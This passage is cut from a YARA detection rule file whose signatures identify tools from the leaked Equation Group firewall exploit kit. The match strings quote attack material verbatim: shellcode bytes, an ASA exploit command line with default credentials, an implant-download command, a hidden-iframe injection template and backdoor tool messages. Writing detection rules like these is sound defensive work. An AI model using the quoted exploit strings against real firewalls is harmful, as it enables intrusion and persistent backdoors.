(https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"firefox http://127.0.0.1:8000/$_name\" fullword ascii\n        $x2 = \"What is the name of your implant:\" fullword ascii\n        $x3 = \"killall thttpd\" fullword ascii\n        $x4 = \"copy http://<IP>:80/$_name flash:/$_name\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 2KB and 1 of ($x*)) or (all of them)\n}\n\nrule EquationGroup_shellcode\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: shellcode.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_shellcode\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"execute_post = '\\\\xe8\\\\x00\\\\x00\\\\x00\\\\x00\\\\x5d\\\\xbe\\\\xef\\\\xbe\\\\xad\\\\xde\\\\x89\\\\xf7\\\\x89\\\\xec\\\\x29\\\\xf4\\\\xb8\\\\x03\\\\x00\\\\x00\\\\x00\" ascii\n        $s2 = \"tiny_exec = '\\\\x7f\\\\x45\\\\x4c\\\\x46\\\\x01\\\\x01\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x02\\\\x00\\\\x03\\\\x00\\\\x01\\\\x00\\\\x00\" ascii\n        $s3 = \"auth_id = '\\\\x31\\\\xc0\\\\xb0\\\\x03\\\\x31\\\\xdb\\\\x89\\\\xe1\\\\x31\\\\xd2\\\\xb6\\\\xf0\\\\xb2\\\\x0d\\\\xcd\\\\x80\\\\x3d\\\\xff\\\\xff\\\\xff\\\\xff\\\\x75\\\\x07\" ascii\n        $c1 = { e8 00 00 00 00 5d be ef be ad de 89 f7 89 ec 29 f4 b8 03 00 00 00 }\n        $c3 = { 31 c0 b0 03 31 db 89 e1 31 d2 b6 f0 b2 0d cd 80 3d ff ff ff ff 75 07 }\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_EPBA\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: EPBA.script)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_EPBA\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"./epicbanana_2.0.0.1.py -t 127.0.0.1 --proto=ssh --username=cisco --password=cisco --target_vers=asa804 --mem=NA -p 22 \" fullword ascii\n        $x2 = \"-t TARGET_IP, --target_ip=TARGET_IP -- Either 127.0.0.1 or Win Ops IP\" fullword ascii\n        $x3 = \"./bride-1100 --lp 127.0.0.1 --implant 127.0.0.1 --sport RHP --dport RHP\" fullword ascii\n        $x4 = \"--target_vers=TARGET_VERS    target Pix version (pix712, asa804) (REQUIRED)\" fullword ascii\n        $x5 = \"-p DEST_PORT, --dest_port=DEST_PORT defaults: telnet=23, ssh=22 (optional) - Change to LOCAL redirect port\" fullword ascii\n        $x6 = \"this operation is complete, BananaGlee will\" fullword ascii\n        $x7 = \"cd /current/bin/FW/BGXXXX/Install/LP\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2023 and filesize < 7KB and 1 of ($x*)) or (3 of them)\n}\n\nrule EquationGroup_BPIE\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BPIE-2201.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BPIE\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"profProcessPacket\" fullword ascii\n        $s2 = \".got_loader\" fullword ascii\n        $s3 = \"getTimeSlotCmdHandler\" fullword ascii\n        $s4 = \"getIpIpCmdHandler\" fullword ascii\n        $s5 = \"LOADED\" fullword ascii\n        $s6 = \"profStartScan\" fullword ascii\n        $s7 = \"tmpData.1\" fullword ascii\n        $s8 = \"resetCmdHandler\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 70KB and 6 of ($s*))\n}\n\nrule EquationGroup_jetplow_SH\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: jetplow.sh)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_jetplow_SH\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"cd /current/bin/FW/BANANAGLEE/$bgver/Install/LP/jetplow\" fullword ascii\n        $s2 = \"***** Please place your UA in /current/bin/FW/OPS *****\" fullword ascii\n        $s3 = \"ln -s ../jp/orig_code.bin orig_code_pixGen.bin\" fullword ascii\n        $s4 = \"*****             Welcome to JetPlow              *****\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_BBANJO\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BBANJO-3011.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BBANJO\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"get_lsl_interfaces\" fullword ascii\n        $s2 = \"encryptFC4Payload\" fullword ascii\n        $s3 = \".got_loader\" fullword ascii\n        $s4 = \"beacon_getconfig\" fullword ascii\n        $s5 = \"LOADED\" fullword ascii\n        $s6 = \"FormBeaconPacket\" fullword ascii\n        $s7 = \"beacon_reconfigure\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 50KB and all of them)\n}\n\nrule EquationGroup_BPATROL_2201\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BPATROL-2201.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BPATROL_2201\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"dumpConfig\" fullword ascii\n        $s2 = \"getstatusHandler\" fullword ascii\n        $s3 = \".got_loader\" fullword ascii\n        $s4 = \"xtractdata\" fullword ascii\n        $s5 = \"KEEPGOING\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 40KB and all of them)\n}\n\nrule EquationGroup_extrabacon\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: extrabacon_1.1.0.1.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_extrabacon\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"To disable password checking on target:\" fullword ascii\n        $x2 = \"[-] target is running\" fullword ascii\n        $x3 = \"[-] problem importing version-specific shellcode from\" fullword ascii\n        $x4 = \"[+] importing version-specific shellcode\" fullword ascii\n        $s5 = \"[-] unsupported target version, abort\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_sploit_py\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: sploit.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_sploit_py\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"the --spoof option requires 3 or 4 fields as follows redir_ip\" ascii\n        $x2 = \"[-] timeout waiting for response - target may have crashed\" fullword ascii\n        $x3 = \"[-] no response from health check - target may have crashed\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_uninstallPBD\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: uninstallPBD.bat)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_uninstallPBD\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"memset 00e9a05c 4 38845b88\" fullword ascii\n        $s2 = \"_hidecmd\" fullword ascii\n        $s3 = \"memset 013abd04 1 0d\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_BICECREAM\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BICECREAM-2140)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BICECREAM\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Could not connect to target device: %s:%d. Please check IP address.\" fullword ascii\n        $s2 = \"command data size is invalid for an exec cmd\" fullword ascii\n        $s3 = \"A script was specified but target is not a PPC405-based NetScreen (NS5XT, NS25, and NS50). Executing scripts is supported but ma\" ascii\n        $s4 = \"Execute 0x%08x with args (%08x, %08x, %08x, %08x): [y/n]\" fullword ascii\n        $s5 = \"Execute 0x%08x with args (%08x, %08x, %08x): [y/n]\" fullword ascii\n        $s6 = \"[%d] Execute code.\" fullword ascii\n        $s7 = \"Execute 0x%08x with args (%08x): [y/n]\" fullword ascii\n        $s8 = \"dump_value_LHASH_DOALL_ARG\" fullword ascii\n        $s9 = \"Eggcode is complete. Pass execution to it? [y/n]\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 5000KB and 2 of them) or (5 of them)\n}\n\nrule EquationGroup_create_http_injection\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: create_http_injection.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_create_http_injection\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"required by SECONDDATE\" fullword ascii\n        $s1 = \"help='Output file name (optional). By default the resulting data is written to stdout.')\" fullword ascii\n        $s2 = \"data = '<html><body onload=\\\"location.reload(true)\\\"><iframe src=\\\"%s\\\" height=\\\"1\\\" width=\\\"1\\\" scrolling=\\\"no\\\" frameborder=\\\"\" ascii\n        $s3 = \"version='%prog 1.0',\" fullword ascii\n        $s4 = \"usage='%prog [ ... options ... ] url',\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 3KB and ($x1 or 2 of them)) or (all of them)\n}\n\nrule EquationGroup_BFLEA_2201\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BFLEA-2201.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BFLEA_2201\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \".got_loader\" fullword ascii\n        $s2 = \"LOADED\" fullword ascii\n        $s3 = \"readFlashHandler\" fullword ascii\n        $s4 = \"KEEPGOING\" fullword ascii\n        $s5 = \"flashRtnsPix6x.c\" fullword ascii\n        $s6 = \"fix_ip_cksum_incr\" fullword ascii\n        $s7 = \"writeFlashHandler\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 30KB and 5 of them) or (all of them)\n}\n\nrule EquationGroup_BpfCreator_RHEL4\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BpfCreator-RHEL4)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BpfCreator_RHEL4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"usage %s \\\"<tcpdump pcap string>\\\" <outfile>\" fullword ascii\n        $s2 = \"error reading dump file: %s\" fullword ascii\n        $s3 = \"truncated dump file; tried to read %u captured bytes, only got %lu\" fullword ascii\n        $s4 = \"%s: link-layer type %d isn't supported in savefiles\" fullword ascii\n        $s5 = \"DLT %d is not one of the DLTs supported by this device\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 2000KB and all of them)\n}\n\nrule EquationGroup_StoreFc\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: StoreFc.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_StoreFc\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Usage: StoreFc.py --configFile=<path to xml file> --implantFile=<path to BinStore implant> [--outputFile=<file to write the conf\" ascii\n        $x2 = \"raise Exception, \\\"Must supply both a config file and implant file.\\\"\" fullword ascii\n        $x3 = \"This is wrapper for Store.py that FELONYCROWBAR will use. This\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_hexdump\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: hexdump.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_hexdump\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"def hexdump(x,lead=\\\"[+] \\\",out=sys.stdout):\" fullword ascii\n        $s2 = \"print >>out, \\\"%s%04x  \\\" % (lead,i),\" fullword ascii\n        $s3 = \"print >>out, \\\"%02X\\\" % ord(x[i+j]),\" fullword ascii\n        $s4 = \"print >>out, sane(x[i:i+16])\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 1KB and 2 of ($s*)) or (all of them)\n}\n\nrule EquationGroup_BBALL\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BBALL_E28F6-2201.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BBALL\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Components/Modules/BiosModule/Implant/E28F6/../e28f640j3_asm.S\" fullword ascii\n        $s2 = \".got_loader\" fullword ascii\n        $s3 = \"handler_readBIOS\" fullword ascii\n        $s4 = \"cmosReadByte\" fullword ascii\n        $s5 = \"KEEPGOING\" fullword ascii\n        $s6 = \"checksumAreaConfirmed.0\" fullword ascii\n        $s7 = \"writeSpeedPlow.c\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 40KB and 4 of ($s*)) or (all of them)\n}\n\nrule EquationGroup_BARPUNCH_BPICKER\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: BARPUNCH-3110, BPICKER-3100)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BARPUNCH_BPICKER\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s --lptimeout %u\" fullword ascii\n        $x2 = \"%s -c <cmdtype> -l <lp> -i <implant> -k <ikey> -s <port> -d <port> [operation] [options]\" fullword ascii\n        $x3 = \"* [%lu] 0x%x is marked as stateless (the module will be persisted without its configuration)\" fullword ascii\n        $x4 = \"%s version %s already has persistence installed. If you want to uninstall,\" fullword ascii\n        $x5 = \"The active module(s) on the target are not meant to be persisted\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 6000KB and 1 of them) or (3 of them)\n}\n\nrule EquationGroup_Implants_Gen6\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_Implants_Gen6\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"LP.c:pixSecurity - Improper number of bytes read in Security/Interface Information\" fullword ascii\n        $s2 = \"LP.c:pixSecurity - Not in Session\" fullword ascii\n        $s3 = \"getModInterface__preloadedModules\" fullword ascii\n        $s4 = \"showCommands\" fullword ascii\n        $s5 = \"readModuleInterface\" fullword ascii\n        $s6 = \"Wrapping_Not_Necessary_Or_Wrapping_Ok\" fullword ascii\n        $s7 = \"Get_CMD_List\" fullword ascii\n        $s8 = \"LP_Listen2\" fullword ascii\n        $s9 = \"killCmdList\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 6000KB and all of them)\n}\n\nrule EquationGroup_Implants_Gen5\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_Implants_Gen5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Module and Implant versions do not match.  This module is not compatible with the target implant\" fullword ascii\n        $s1 = \"%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.log\" fullword ascii\n        $s2 = \"%s/BF_%04d%02d%02d.log\" fullword ascii\n        $s3 = \"%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.bin\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and 1 of ($x*)) or (all of them)\n}\n\nrule EquationGroup_pandarock\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: pandarock_v1.11.1.1.bin, pit)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_pandarock\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"* Not attempting to execute \\\"%s\\\" command\" fullword ascii\n        $x2 = \"TERMINATING SCRIPT (command error or \\\"quit\\\" encountered)\" fullword ascii\n        $x3 = \"execute code in <file> passing <argX> (HEX)\" fullword ascii\n        $x4 = \"* Use arrow keys to scroll through command history\" fullword ascii\n        $s1 = \"pitCmd_processCmdLine\" fullword ascii\n        $s2 = \"execute all commands in <file>\" fullword ascii\n        $s3 = \"__processShellCmd\" fullword ascii\n        $s4 = \"pitTarget_getDstPort\" fullword ascii\n        $s5 = \"__processSetTargetIp\" fullword ascii\n        $o1 = \"Logging commands and output - ON\" fullword ascii\n        $o2 = \"This command is too dangerous.  If you'd like to run it, contact the development team\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 3000KB and 1 of ($x*)) or (4 of them) or 1 of ($o*)\n}\n\nrule EquationGroup_BananaUsurper_writeJetPlow\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: BananaUsurper-2120, writeJetPlow-2130)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BananaUsurper_writeJetPlow\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Implant Version-Specific Values:\" fullword ascii\n        $x2 = \"This function should not be used with a Netscreen, something has gone horribly wrong\" fullword ascii\n        $s1 = \"createSendRecv: recv'd an error from the target.\" fullword ascii\n        $s2 = \"Error: WatchDogTimeout read returned %d instead of 4\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 2000KB and 1 of ($x*)) or (3 of them)\n}\n\nrule EquationGroup_Implants_Gen4\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_Implants_Gen4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Command has not yet been coded\" fullword ascii\n        $s2 = \"Beacon Domain  : www.%s.com\" fullword ascii\n        $s3 = \"This command can only be run on a PIX/ASA\" fullword ascii\n        $s4 = \"Warning! Bad or missing Flash values (in section 2 of .dat file)\" fullword ascii\n        $s5 = \"Printing the interface info and security levels. PIX ONLY.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 3000KB and 3 of them) or (all of them)\n}\n\nrule EquationGroup_Implants_Gen3\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_Implants_Gen3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"incomplete and must be removed manually.)\" fullword ascii\n        $s1 = \"%s: recv'd an error from the target.\" fullword ascii\n        $s2 = \"Unable to fetch the address to the get_uptime_secs function for this OS version\" fullword ascii\n        $s3 = \"upload/activate/de-activate/remove/cmd function failed\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 6000KB and 2 of them) or (all of them)\n}\n\nrule EquationGroup_BLIAR_BLIQUER\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: BLIAR-2110, BLIQUER-2230)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BLIAR_BLIQUER\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Do you wish to activate the implant that is already on the firewall? (y/n): \" fullword ascii\n        $x2 = \"There is no implant present on the firewall.\" fullword ascii\n        $x3 = \"Implant Version :%lx%lx%lx\" fullword ascii\n        $x4 = \"You may now connect to the implant using the pbd idkey\" fullword ascii\n        $x5 = \"No reply from persistant back door.\" fullword ascii\n        $x6 = \"rm -rf pbd.wc; wc -c %s > pbd.wc\" fullword ascii\n        $p1 = \"PBD_GetVersion\" fullword ascii\n        $p2 = \"pbd/pbdEncrypt.bin\" fullword ascii\n        $p3 = \"pbd/pbdGetVersion.pkt\" fullword ascii\n        $p4 = \"pbd/pbdStartWrite.bin\" fullword ascii\n        $p5 = \"pbd/pbd_setNewHookPt.pkt\" fullword ascii\n        $p6 = \"pbd/pbd_Upload_SinglePkt.pkt\" fullword ascii\n        $s1 = \"Unable to fetch hook and jmp addresses for this OS version\" fullword ascii\n        $s2 = \"Could not get hook and jump addresses\" fullword ascii\n        $s3 = \"Enter the name of a clean implant binary (NOT an image):\" fullword ascii\n        $s4 = \"Unable to read dat file for OS version 0x%08lx\" fullword ascii\n        $s5 = \"Invalid implant file\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 3000KB and (1 of ($x*) or 1 of ($p*))) or (3 of them)\n}\n\nrule EquationGroup_sploit\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: sploit.py, sploit.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_sploit\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"print \\\"[+] Connecting to %s:%s\\\" % (self.params.dst['ip'], self.params.dst['port'])\" fullword ascii\n        $s2 = \"@overridable(\\\"Must be overriden if the target will be touched.  Base implementation should not be called.\\\")\" fullword ascii\n        $s3 = \"@overridable(\\\"Must be overriden.  Base implementation should not be called.\\\")\" fullword ascii\n        $s4 = \"exp.load_vinfo()\" fullword ascii\n        $s5 = \"if not okay and self.terminateFlingOnException:\" fullword ascii\n        $s6 = \"print \\\"[-] keyboard interrupt before response received\\\"\" fullword ascii\n        $s7 = \"if self.terminateFlingOnException:\" fullword ascii\n        $s8 = \"print 'Debug info ','='*40\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 90KB and 1 of ($s*)) or (4 of them)\n}\n\nrule EquationGroup_Implants_Gen2\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, writeJetPlow-2130)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_Implants_Gen2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Modules persistence file written successfully\" fullword ascii\n        $x2 = \"Modules persistence data successfully removed\" fullword ascii\n        $x3 = \"No Modules are active on the firewall, nothing to persist\" fullword ascii\n        $s1 = \"--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s \" fullword ascii\n        $s2 = \"Error while attemping to persist modules:\" fullword ascii\n        $s3 = \"Error while reading interface info from PIX\" fullword ascii\n        $s4 = \"LP.c:pixFree - Failed to get response\" fullword ascii\n        $s5 = \"WARNING: LP Timeout specified (%lu seconds) less than default (%u seconds).  Setting default\" fullword ascii\n        $s6 = \"Unable to fetch config address for this OS version\" fullword ascii\n        $s7 = \"LP.c: interface information not available for this session\" fullword ascii\n        $s8 = \"[%s:%s:%d] ERROR: \" fullword ascii\n        $s9 = \"extract_fgbg\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 3000KB and 1 of ($x*)) or (5 of them)\n}\n\nrule EquationGroup_Implants_Gen1\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, lpexe, writeJetPlow-2130)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_Implants_Gen1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"WARNING:  Session may not have been closed!\" 